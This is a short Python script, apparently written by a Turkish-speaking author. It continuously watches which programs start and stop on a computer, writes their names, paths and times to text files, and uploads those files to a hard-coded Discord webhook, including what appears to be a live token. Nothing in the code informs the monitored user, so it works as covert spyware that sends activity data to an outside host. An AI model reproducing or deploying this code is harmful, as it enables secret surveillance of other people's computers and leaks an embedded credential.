import psutil
import requests
import os
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1225692830052388926/lmUu6bnVrYonXpfMB7MAQq-7L_c7BfXbnF9QvnkG0yvpYhu9pKjUqbP_FfjC-t8GZwto'

def get_running_processes():
    running_processes = []
    for proc in psutil.process_iter():
        try:
            running_processes.append({
                'name': proc.name(),
                'path': proc.exe(),
                'create_time': datetime.fromtimestamp(proc.create_time()).strftime("%a %b %d %H:%M:%S %Y"),
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return running_processes

def send_to_discord(content, files=None):
    payload = {'content': content}
    response = requests.post(WEBHOOK_URL, data=payload, files=files)
    return response

def save_to_file(process_list, filename):
    # "distorted" klasörünü oluştur
    if not os.path.exists("distorted"):
        os.makedirs("distorted")

    # Dosya yolunu "distorted" klasörü içine ayarla
    filepath = os.path.join("distorted", filename)

    with open(filepath, 'w', encoding='utf-8') as file:
        for process in process_list:
            file.write(f"Uygulama Adi: {process['name']}\n")
            file.write(f"Yolu: {process['path']}\n")
            file.write(f"Tarih/Saat: {process['create_time']}\n\n")

def main():
    # Baslangic durumu
    previous_processes = get_running_processes()

    while True:
        # Mevcut calisan islemler
        current_processes = get_running_processes()

        # Kapatilan islemleri ve yeni baslatilan islemleri belirle
        closed_processes = [prev_process for prev_process in previous_processes if prev_process not in current_processes]
        new_processes = [curr_process for curr_process in current_processes if curr_process not in previous_processes]

        # Kapatilan islemleri .txt dosyasina kaydet ve Discord'a gonder
        if closed_processes:
            save_to_file(closed_processes, 'kapatilan_islemler.txt')
            files = {'file': open(os.path.join("distorted", 'kapatilan_islemler.txt'), 'rb')}
            send_to_discord("Kapatılan işlemler:", files)

        # Yeni baslatilan islemleri .txt dosyasina kaydet ve Discord'a gonder
        if new_processes:
            save_to_file(new_processes, 'acilan_islemler.txt')
            files = {'file': open(os.path.join("distorted", 'acilan_islemler.txt'), 'rb')}
            send_to_discord("Açılan işlemler:", files)

        # Onceki islemleri guncelle
        previous_processes = current_processes

# Düzeltilmiş satır:
if __name__ == "__main__":
    main()
